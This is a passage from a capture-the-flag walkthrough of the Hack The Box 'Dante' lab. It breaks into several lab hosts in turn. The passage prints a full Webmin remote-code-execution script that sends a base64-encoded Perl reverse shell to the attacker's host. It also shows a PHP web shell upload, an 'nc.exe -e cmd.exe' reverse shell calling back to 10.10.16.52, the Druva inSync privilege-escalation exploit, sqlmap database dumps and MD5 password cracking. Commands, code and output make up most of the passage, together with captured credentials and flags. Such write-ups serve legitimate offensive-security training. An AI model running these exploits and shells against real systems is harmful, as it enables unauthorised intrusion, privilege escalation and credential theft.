	proxychains wget 172.16.1.17/webmin-1.900.zip
	proxychains firefox http://172.16.1.17/webmin/
	
	proxychains firefox 172.16.1.17:10000	// default root:root fails 

Connect to Samba service:

	proxychains smbclient -L \\172.16.1.17	// list services; root:<blankpassword>

```text
Sharename       Type      Comment
---------       ----      -------
forensics       Disk      
IPC$            IPC       IPC Service (DANTE-NIX03 server (Samba, Ubuntu))
```

Connect to share:

	proxychains smbclient \\\\172.16.1.17\\forensics	// <blankpassword>
	
```text
smb: \> ls
smb: \> get monitor
```

	file monitor	// it's a pcap file
	mv monitor monitor.pcap
	
	wireshark monitor.pcap					// open pcap file
	Statistics => Protocol => Hierarchy		// view pcap statistics
	http									// filter for packet type in text box

There is UDP as well as TCP traffic present. Under TCP, we can see that HTML Form URL Encoded packets are present. These packets are transmitted using HTTP protocol. Let's filter for HTTP packets.

Right-click on the HTTP POST request packet and click:

	"Follow" => "HTTP Stream".

```text
POST /session_login.cgi HTTP/1.1
Host: 172.16.88.154:10000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://172.16.88.154:10000/session_login.cgi?logout=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Origin: http://172.16.88.154:10000
DNT: 1
Connection: keep-alive
Cookie: redirect=1; testing=1; sid=x
Upgrade-Insecure-Requests: 1
user=admin&pass=password6543
```

	proxychains firefox http://172.16.1.17:10000/session_login.cgi	// admin:password6543

```text
# Error - Access denied for 172.16.1.100. The host has been blocked because of too many authentication failures.
```

Clear the filter, filter for http, and then look at the other POST requests:

```text
POST /session_login.cgi HTTP/1.1
Host: 172.16.88.154:10000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://172.16.88.154:10000/session_login.cgi
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Origin: http://172.16.88.154:10000
DNT: 1
Connection: keep-alive
Cookie: redirect=1; testing=1; sid=x
Upgrade-Insecure-Requests: 1
user=admin&pass=Password6543
```

Webmin reposts that the installed version 1.900 is old and there are RCE exploits available. [^4]

	firefox	// webmin 1.900 exploit github
	wget https://raw.githubusercontent.com/roughiz/Webmin-1.910-Exploit-Script/master/webmin_exploit.py

Note: I've edited the code to remove the colored dependency. 

```python
!/usr/bin/env python2
# -*- coding: utf8 -*-
import requests
import urllib3
urllib3.disable_warnings()
import argparse
import sys


arg_parser = argparse.ArgumentParser(description='Webmin 1.910 - Remote Code Execution using, python script')
arg_parser.add_argument('--rhost', dest='rhost', help='Ip address of the webmin server', type=str, required=True)
arg_parser.add_argument("--rport", dest="rport", type=int, help="target webmin port, default 10000", default=10000)
arg_parser.add_argument('--lhost', dest='lhost', help='Local ip address to listen for the reverse shell', type=str, required=True)
arg_parser.add_argument("--lport", dest="lport", type=int, help="The Bind port for the reverse shell\n Default is 4444", default=4444)
arg_parser.add_argument('-u','--user', dest='user', help='The username to use for authentication\n By default is admin', default='admin', type=str)
arg_parser.add_argument('-p','--password', dest='password', help='The password to use for authentication', required=True, type=str)
arg_parser.add_argument('-t','--TARGETURI', dest='targeturi', help='Base path for Webmin application. By default set to "/"', default='/',type=str)
arg_parser.add_argument('-s','--SSL', dest='ssl', help='Negotiate SSL/TLS for outgoing connections. By default ssl is set to False', default='False',type=str)
args = arg_parser.parse_args()

# proxy set for test
proxies = {'http': 'http://127.0.0.1:8080','https': 'http://127.0.0.1:8080'}
# retrieve the Cookies sid:
print('****************************** Webmin 1.910 Exploit By roughiz*******************************')
print('*********************************************************************************************')
print('*********************************************************************************************')
print('*********************************************************************************************')
print('****************************** Retrieve Cookies sid *****************************************')

req={'page':'','user':args.user,'pass':args.password}
if args.ssl.lower() in ('yes', 'true', 't', 'y', '1'):
   url="https://"+args.rhost+":"+str(args.rport)+args.targeturi
else:
   url="http://"+args.rhost+":"+str(args.rport)+args.targeturi

resu=requests.post(url+"session_login.cgi",data=req, cookies={"testing":"1"}, verify=False, allow_redirects=False)
if "This web server is running in SSL mode" in resu.content:
    print ('********** [+] [Exploit][ERROR] Enable the ssl arg !!')
    print(resu.content)
    sys.exit(1)
if "sid" in resu.headers['Set-Cookie']:
   sid= resu.headers['Set-Cookie'].replace('\n', '').split('=')[1].split(";")[0].strip()
   print("\n")
   print('********** [+] [Exploit] The Cookie is '+sid)
else:
   print('********** [+] [Exploit][ERROR] The authentication to the webmin server failed')
   sys.exit(1)

print("")
print('********************************************************************************************')
print('****************************** Create payload and Exploit ***********************************')
print("\n")

# Templateofthe payload 
template="perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,\""+args.lhost+":"+str(args.lport)+"\");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'"
b64payload = template.encode('base64').replace('\n', '').strip()
payload=' | bash -c "{echo,'+b64payload+'}|{base64,-d}|{bash,-i}"'

## request the payload
req={'u':['acl/apt',payload]}
headers= {'Connection': 'close','referer': url+"package-updates/?xnavigation=1"}

try:
  resu=requests.post(url+"package-updates/update.cgi",data=req, cookies={"sid":sid}, verify=False, allow_redirects=False, headers=headers, timeout=10)
except requests.Timeout:
    pass
except requests.ConnectionError:
    pass
print('\n')
print('********** [+] [Exploit] Verify you nc listener on port '+str(args.lport)+' for the incomming reverse shell')
```

Exploit:

	nc -lvnp 9001
	proxychains python webmin_exploit.py  --rhost 172.16.1.17 --lhost 10.10.16.52 --lport 9001 -u admin -p Password6543
	
Upgrade stty:
	
	python3 -c 'import pty;pty.spawn("/bin/bash")'
	<Ctrl+Z>
	stty raw -echo;fg
	export TERM=xterm

	cat /root/flag.txt	// DANTE{SH4RKS_4R3_3V3RYWHERE}

# Let's take this discussion elsewhere

	proxychains nmap 172.16.1.13 -sT -sV -Pn -T5 -vvvv	// 80,443,445 didn't finish due to timeout
	proxychains nmap 172.16.1.13 -sT -sV -A -Pn -vvvv
	
```bash
PORT    STATE SERVICE       REASON  VERSION
80/tcp  open  http          syn-ack Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.7)
| http-title: Welcome to XAMPP
|_Requested resource was http://172.16.1.13/dashboard/
|_http-favicon: Unknown favicon MD5: 56F7C04657931F2D0B79371B2D6E9820
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.7
443/tcp open  ssl/http      syn-ack Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.7)
|_http-title: Bad request!
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4 4cc9 9e84 b26f 9e63 9f9e d229 dee0
| SHA-1: b023 8c54 7a90 5bfa 119c 4e8b acca eacf 3649 1ff6
| -----BEGIN CERTIFICATE-----
| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls
| b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD
| VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj
| 7K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o
| J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT
| gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD
| gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+9whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd
| aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL
| vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=
|_-----END CERTIFICATE-----
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.7
445/tcp open  microsoft-ds? syn-ack

Host script results:
| smb2-time: 
|   date: 2021-12-26T19:47:05
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 19472/tcp): CLEAN (Couldn't establish connection (Nsock connect failed immediately))
|   Check 2 (port 49000/tcp): CLEAN (Couldn't establish connection (Nsock connect failed immediately))
|   Check 3 (port 53933/udp): CLEAN (Timeout)
|   Check 4 (port 4179/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 1h10m43s
```

Connect to SMB:

	proxychains smbclient -L \\172.16.1.13	// NT_STATUS_ACCESS_DENIED

Look at HTTP server:

	proxychains firefox http://172.16.1.13/
	proxychains firefox http://172.16.1.13/phpmyadmin/				// only accessible locally
	proxychains firefox http://172.16.1.13/dashboard/phpinfo.php

Enumerate files and folders:

Note:

```bash
--proxy	// Proxy to use for requests [http(s)://host:port]
```

	gobuster dir --proxy socks5://127.0.0.1:1080 --url http://172.16.1.13/ -w /usr/share/wordlists/dirb/common.txt

```bash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.16.1.13/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] Proxy:                   socks5://127.0.0.1:1080
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/12/26 15:33:37 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 1043]
/.htpasswd            (Status: 403) [Size: 1043]
/.htaccess            (Status: 403) [Size: 1043]
/aux                  (Status: 403) [Size: 1043]
/cgi-bin/             (Status: 403) [Size: 1057]
/com1                 (Status: 403) [Size: 1043]
/com2                 (Status: 403) [Size: 1043]
/com3                 (Status: 403) [Size: 1043]
/con                  (Status: 403) [Size: 1043]
/dashboard            (Status: 301) [Size: 338] [--> http://172.16.1.13/dashboard/]
/discuss              (Status: 301) [Size: 336] [--> http://172.16.1.13/discuss/]  
/favicon.ico          (Status: 200) [Size: 30894]                                  
/examples             (Status: 503) [Size: 1057]                                   
/img                  (Status: 301) [Size: 332] [--> http://172.16.1.13/img/]      
/index.php            (Status: 302) [Size: 0] [--> http://172.16.1.13/dashboard/]  
/licenses             (Status: 403) [Size: 1202]                                   
/lpt1                 (Status: 403) [Size: 1043]                                   
/lpt2                 (Status: 403) [Size: 1043]                                   
/nul                  (Status: 403) [Size: 1043]                                   
/phpmyadmin           (Status: 403) [Size: 1202]                                   
/prn                  (Status: 403) [Size: 1043]                                   
/server-info          (Status: 403) [Size: 1202]                                   
/server-status        (Status: 403) [Size: 1202]                                   
/webalizer            (Status: 403) [Size: 1043]                                   
                                                                                   
===============================================================
2021/12/26 15:34:10 Finished
===============================================================
```

	proxychains firefox http://172.16.1.13/discuss/	// "Technical Discussion Forum" mentioned several places

Exploit found by searching for: [^5]

```
Technical Discussion Forum exploit
```

```php
# Exploit Title: Online Discussion Forum Site 1.0 - Remote Code Execution
# Google Dork: N/A
# Date: 2020-05-24
# Exploit Author: Selim Enes 'Enesdex' Karaduman
# Vendor Homepage: https://www.sourcecodester.com/php/14233/online-discussion-forum-site.html
# Software Link: https://www.sourcecodester.com/download-code?nid=14233&title=Online+Discussion+Forum+Site
# Version: 1.0 (REQUIRED)
# Tested on: Windows 10 / Wamp Server
# CVE : N/A
Go to http://localhost/Online%20Discussion%20Forum%20Site/register.php register page to sign up
Then fill other fields and upload the shell.php with following PHP-shell-code

<?php
$command = shell_exec($_REQUEST['cmd']);
echo $command;
?>

After the registration process is completed go to the following page and execute the os command via uploaded shell
http://localhost/Online%20Discussion%20Forum%20Site/ups/shell.php?cmd=$THECODE-YOU-WANT-TO-EXECUTE

Any unauthenticated attacker is able to execute arbitrary os command
```

The registration form has the option to upload an image. Save the below code to shell.php and upload it using the form.

	vi shell.php

```php
<?php echo exec($_GET["cmd"]);?>
```

Click on Submit to complete registration and upload the webshell. The web shell can be accessed at:

	proxychains firefox http://172.16.1.13/discuss/ups/shell.php?cmd=whoami	// dante-ws01\gerald

Let's upgrade to a proper shell. Upload netcat to target:

	ifconfig tun0										// local IP 10.10.16.52
	cd "/home/kali/HTB/Pro Labs/Dante/www"
	cp /usr/share/windows-resources/binaries/nc.exe .
	python3 -m http.server 80
	
	proxychains firefox http://172.16.1.13/discuss/ups/shell.php?cmd=powershell wget 10.10.16.52/nc.exe -o nc.exe

	nc -lvnp 9001	// locally
	
	proxychains firefox http://172.16.1.13/discuss/ups/shell.php?cmd=nc.exe -e cmd.exe 10.10.16.52 9001

```Powershell
Microsoft Windows [Version 10.0.18363.900]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\discuss\ups>
```

	hostname	// DANTE-WS01

Get Gerald's flag:

	type C:\Users\gerald\Desktop\flag.txt	// DANTE{l355_t4lk_m04r_l15tening}

# Compare my numbers

Check installed software:

	cd Program Files (x86)
	dir

```Powershell
13/07/2020  05:42    <DIR>          .
13/07/2020  05:42    <DIR>          ..
18/03/2019  21:02    <DIR>          Common Files
13/07/2020  03:35    <DIR>          Druva
13/07/2020  05:39    <DIR>          Internet Explorer
18/03/2019  20:52    <DIR>          Microsoft.NET
18/03/2019  22:20    <DIR>          Windows Defender
18/03/2019  20:52    <DIR>          Windows Mail
13/07/2020  05:39    <DIR>          Windows Media Player
18/03/2019  22:23    <DIR>          Windows Multimedia Platform
18/03/2019  21:02    <DIR>          Windows NT
13/07/2020  05:39    <DIR>          Windows Photo Viewer
18/03/2019  22:23    <DIR>          Windows Portable Devices
18/03/2019  20:52    <DIR>          WindowsPowerShell
               0 File(s)              0 bytes
              14 Dir(s)   4,727,693,312 bytes free
```
	
	cd Druva\InSync
	type licence.txt

```Powershell
Druva InSync 6.6.3
Copyright (c) 2019 Druva Inc.
```

There is an LFI exploit for this version of the software. [^6]

	cd www
	vi druva.py
	
```python
# Exploit Title: Druva inSync Windows Client 6.6.3 - Local Privilege Escalation
# Date: 2020-05-21
# Exploit Author: Matteo Malvica
# Credits: Chris Lyne for previous version's exploit 
# Vendor Homepage: druva.com
# Software Link: https://downloads.druva.com/downloads/inSync/Windows/6.6.3/inSync6.6.3r102156.msi
# Version: 6.6.3
# Tested on: Windows 10 1909-18363.778
# CVE: CVE-2020-5752
# Command injection in inSyncCPHwnet64 RPC service
# Runs as nt authority\system. so we have a local privilege escalation
# The path validation has been only implemented through a 'strncmp' function which can be bypassed by
# appending a directory traversal escape sequence at the end of the valid path.
# Writeup: https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/ 

# Example usage:
#python insync.py "windows\system32\cmd.exe /C net user Leon /add"
#python insync.py "windows\system32\cmd.exe /C net localgroup Administrators Leon /add"

import socket
import struct
import sys

if len(sys.argv) < 2:
    print "Usage: " + __file__ + " <quoted command to execute>"
    print "E.g. " + __file__ + " \"net user /add tenable\""
    sys.exit(0)

ip = '127.0.0.1'
port = 6064
command_line = 'C:\\ProgramData\\Druva\\inSync4\\..\\..\\..\\..\\..\\..\\..\\..\\' + sys.argv[1] 

def make_wide(str):
    new_str = ''
    for c in str:
        new_str += c
        new_str += '\x00'
    return new_str

hello = "inSync PHC RPCW[v0002]"

func_num = "\x05\x00\x00\x00"                                   # 05 is to run a command, passed as an agrument to CreateProcessW
command_line = make_wide(command_line)                          # converts ascii to UTF-8
command_length = struct.pack('<i', len(command_line))           # packed as little-endian integer
requests = [ hello, func_num, command_length, command_line ]    # sends each request separately

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((ip, port))

i = 1
for req in requests:
    print 'Sending request' + str(i)
    sock.send(req)
    i += 1

sock.close()

print "Done."
```

	python3 -m http.server 80							// serve exploit

	cd C:\Users\gerald\AppData\Local\Temp
	mkdir junk
	cd junk
	powershell wget 10.10.16.52/druva.py -o druva.py	// download exploit

Add gerald to the administrators group:

	C:\python27\python.exe druva.py "windows\system32\cmd.exe /C net localgroup Administrators gerald /add"

Verify this:

	net user gerald

```text
User name                    gerald
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            ?13/?07/?2020 09:26:56
Password expires             Never
Password changeable          ?13/?07/?2020 09:26:56
Password required            No
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   ?25/?12/?2021 20:07:42

Logon hours allowed          All

Local Group Memberships      *Administrators       *Users                
Global Group memberships     *None                 
The command completed successfully.
```

Due to UAC (User Access Control) we're unable to read the flag on the Administrator desktop. Let's get another netcat reverse shell.

	nc -lvnp 9002				// start another listener on local machine
	C:\python27\python.exe druva.py "windows\system32\cmd.exe /C C:\xampp\htdocs\discuss\ups\nc.exe 10.10.16.52 9002 -e cmd.exe"

```text
C:\WINDOWS\system32>
```

	whoami											// nt authority\system
	type C:\Users\Administrator\Desktop\flag.txt	// DANTE{Bad_pr4ct1ces_Thru_strncmp}
	
# Again and again

	proxychains nmap -sT -sV -Pn -T5 172.16.1.12
	
```text
Nmap scan report for 172.16.1.12
Host is up (0.12s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp
22/tcp   open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.43 ((Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3)
443/tcp  open  ssl/http Apache httpd 2.4.43 ((Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3)
3306/tcp open  mysql?
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port21-TCP:V=7.92%I=7%D=12/27%Time=61C9D620%P=x86_64-pc-linux-gnu%r(NUL
SF:L,33,"220\x20ProFTPD\x20Server\x20\(ProFTPD\)\x20\[::ffff:172\.16\.1\.1
SF:2\]\r\n")%r(GenericLines,8F,"220\x20ProFTPD\x20Server\x20\(ProFTPD\)\x2
SF:0\[::ffff:172\.16\.1\.12\]\r\n500\x20Invalid\x20command:\x20try\x20bein
SF:g\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\x20being\x20
SF:more\x20creative\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3306-TCP:V=7.92%I=7%D=12/27%Time=61C9D61A%P=x86_64-pc-linux-gnu%r(N
SF:ULL,4B,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20all
SF:owed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(GenericLin
SF:es,4B,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allo
SF:wed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(GetRequest,
SF:4B,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed
SF:\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(HTTPOptions,4B
SF:,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\x
SF:20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(RTSPRequest,4B,"
SF:G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\x20
SF:to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(RPCCheck,4B,"G\0\0
SF:\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\x20to\x2
SF:0connect\x20to\x20this\x20MariaDB\x20server")%r(DNSVersionBindReqTCP,4B
SF:,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\x
SF:20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(DNSStatusRequest
SF:TCP,4B,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20all
SF:owed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(Help,4B,"G
SF:\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\x20t
SF:o\x20connect\x20to\x20this\x20MariaDB\x20server")%r(SSLSessionReq,4B,"G
SF:\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\x20t
SF:o\x20connect\x20to\x20this\x20MariaDB\x20server")%r(TerminalServerCooki
SF:e,4B,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allow
SF:ed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(TLSSessionRe
SF:q,4B,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allow
SF:ed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(Kerberos,4B,
SF:"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\x2
SF:0to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(SMBProgNeg,4B,"G\
SF:0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\x20to
SF:\x20connect\x20to\x20this\x20MariaDB\x20server")%r(X11Probe,4B,"G\0\0\x
SF:01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\x20to\x20c
SF:onnect\x20to\x20this\x20MariaDB\x20server");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
	
	proxychains firefox 172.16.1.12	// an XAMPP dashboard

Enumerate files and folders:

Note:

```text
--proxy	// Proxy to use for requests [http(s)://host:port]
```

	gobuster dir --proxy socks5://127.0.0.1:1080 --url http://172.16.1.12/ -w /usr/share/wordlists/dirb/common.txt

```text
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.16.1.12/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] Proxy:                   socks5://127.0.0.1:1080
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/12/27 10:14:46 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 1019]
/.htpasswd            (Status: 403) [Size: 1019]
/.htaccess            (Status: 403) [Size: 1019]
/blog                 (Status: 301) [Size: 232] [--> http://172.16.1.12/blog/]
/cgi-bin/             (Status: 403) [Size: 1033]                              
/dashboard            (Status: 301) [Size: 237] [--> http://172.16.1.12/dashboard/]
/favicon.ico          (Status: 200) [Size: 30894]                                  
/img                  (Status: 301) [Size: 231] [--> http://172.16.1.12/img/]      
/index.php            (Status: 302) [Size: 0] [--> http://172.16.1.12/dashboard/]  
/phpmyadmin           (Status: 403) [Size: 1188]                                   
/webalizer            (Status: 301) [Size: 237] [--> http://172.16.1.12/webalizer/]
                                                                                   
===============================================================
2021/12/27 10:15:23 Finished
===============================================================
```
	
	proxychains firefox 172.16.1.12/blog/	// "Responsive Blog"
	
	searchsploit responsive blog    
	
```text
Responsive Online Blog 1.0 - 'id' SQL Injection	| php/webapps/48615.txt
```
	
	mkdir 172.16.1.12
	cd 172.16.1.12
	searchsploit -m php/webapps/48615.txt
	cat 48615.txt

```php
  Exploit: Responsive Online Blog 1.0 - 'id' SQL Injection
      URL: https://www.exploit-db.com/exploits/48615
     Path: /usr/share/exploitdb/exploits/php/webapps/48615.txt
File Type: Unicode text, UTF-8 text

# Exploit Title: Responsive Online Blog 1.0 - 'id' SQL Injection
# Date: 2020-06-23
# Exploit Author: Eren Şimşek
# Vendor Homepage: https://www.sourcecodester.com/php/14194/responsive-online-blog-website-using-phpmysql.html
# Software Link: https://www.sourcecodester.com/download-code?nid=14194&title=Responsive+Online+Blog+Website+using+PHP%2FMySQL
# Version: v1.0
# Tested on: Linux - Wamp Server

>Vulnerable File
   /category.php

>Vulnerable Code

   $id=$_REQUEST['id'];
   $query="SELECT * from blog_categories where id='".$id."'";
   Id parameter enters sql query without any changes

>Proof Of Concept
   sqlmap 'http://localhost/resblog/category.php?id=1' --dbs --batch
   OR
   http://TARGET/resblog/category.php?id=1' Single Quote will cause SQL error
```

Test for SQLi:

	proxychains firefox http://172.16.1.12/blog/category.php?id=2%27	// ' == %27 in hex

```text
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1''' at line 1
```

Enumerate databases:

	proxychains sqlmap -u http://172.16.1.12/blog/category.php?id=2 --dbs --batch 

```text
available databases [7]:                                                                                            
[*] blog_admin_db
[*] flag
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] test
```

Dump data from flag database:

	proxychains sqlmap -u http://172.16.1.12/blog/category.php?id=2 -D flag --dump

```text
-D			// DBMS database to enumerate
--dump		// Dump DBMS database table entries
--dump-all	// Dump all DBMS databases tables entries
```

```text
Database: flag
Table: flag
[1 entry]
+------------------------------+
| flag                         |
+------------------------------+
| DANTE{wHy_y0U_n0_s3cURe?!?!} |
+------------------------------+
```

# Five doctors

Enumerate tables:

	proxychains sqlmap -u http://172.16.1.12/blog/category.php?id=2 -D blog_admin_db --table

```bash
--tables	// Enumerate DBMS database tables
```

```bash
Database: blog_admin_db                                                                                             
[13 tables]
+-----------------------------+
| banner_posts                |
| blog_categories             |
| blogs                       |
| editors_choice              |
| links                       |
| membership_grouppermissions |
| membership_groups           |
| membership_userpermissions  |
| membership_userrecords      |
| membership_users            |
| page_hits                   |
| titles                      |
| visitor_info                |
+-----------------------------+
```

Enumerate table:

	proxychains sqlmap -u http://172.16.1.12/blog/category.php?id=2 -D blog_admin_db -T membership_users --dump

```bash
-T	// DBMS database table(s) to enumerate
```

```bash
[21:13:55] [INFO] cracked password 'admin' for hash '21232f297a57a5a743894a0e4a801fc3'                              
Database: blog_admin_db                                                                                             
Table: membership_users
[4 entries]
+---------+----------+----------------+---------+---------+---------+---------+------------------------------------------+----------------------------------------------------------------------------------------------+----------+------------+------------+----------------+-------------------+
| groupID | memberID | email          | custom1 | custom2 | custom3 | custom4 | passMD5                                  | comments                                                                                     | isBanned | isApproved | signupDate | pass_reset_key | pass_reset_expiry |
+---------+----------+----------------+---------+---------+---------+---------+------------------------------------------+----------------------------------------------------------------------------------------------+----------+------------+------------+----------------+-------------------+
| 2       | admin    | <blank>        | NULL    | NULL    | NULL    | NULL    | 21232f297a57a5a743894a0e4a801fc3 (admin) | Admin member created automatically on 2018-04-26\nRecord updated automatically on 2018-04-27 | 0        | 1          | 2018-04-26 | NULL           | NULL              |
| NULL    | ben      | ben@dante.htb  | NULL    | NULL    | NULL    | NULL    | 442179ad1de9c25593cabf625c0badb7         | NULL                                                                                         | NULL     | NULL       | NULL       | NULL           | NULL              |
| 3       | egre55   | egre55@htb.com | egre55  | a       | a       | a       | d6501933a2e0ea1f497b87473051417f         | member signed up through the registration form.                                              | 0        | 1          | 2020-08-05 | NULL           | NULL              |
| 1       | guest    | NULL           | NULL    | NULL    | NULL    | NULL    | NULL                                     | Anonymous member created automatically on 2018-04-26                                         | 0        | 1          | 2018-04-26 | NULL           | NULL              |
+---------+----------+----------------+---------+---------+---------+---------+------------------------------------------+----------------------------------------------------------------------------------------------+----------+------------+------------+----------------+-------------------+
```

Save hashes to hashes.txt:

	vi hashes.txt

```
21232f297a57a5a743894a0e4a801fc3	// admin:admin
442179ad1de9c25593cabf625c0badb7	// ben:Welcometomyblog
d6501933a2e0ea1f497b87473051417f
```

Crack hashes:

	cp /usr/share/wordlists/rockyou.txt.gz .
	gunzip rockyou.txt.gz
	john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5

```
admin            (?)     
Welcometomyblog  (?)
```

Log into blog as admin:

	proxychains firefox http://172.16.1.12/blog/blogadmin/index.php?signIn=1	// admin:admin

Create a new blog page and see if we can upload a PHP shell:

```
Note: http://172.16.1.12/blog/blogadmin/blogs_view.php	// Add New
```

```
Error: This file type is not allowed. Only jpg, jpeg, gif, png files can be uploaded
```

Test if we can upload an image:

```
Couldn't save the uploaded file. Try chmoding the upload folder './images/' to 777.
```

Let's move on to the  ben:Welcometomyblog password cracked by John The Ripper:

	proxychains ssh -D 1080 ben@172.16.1.12	// Welcometomyblog

	id

```bash
uid=1000(ben) gid=1000(ben) groups=1000(ben),46(plugdev)
```

	cat flag.txt	// DANTE{Pretty_Horrific_PH4IL!}

# Minus + minus = plus?

	sudo -l

```text
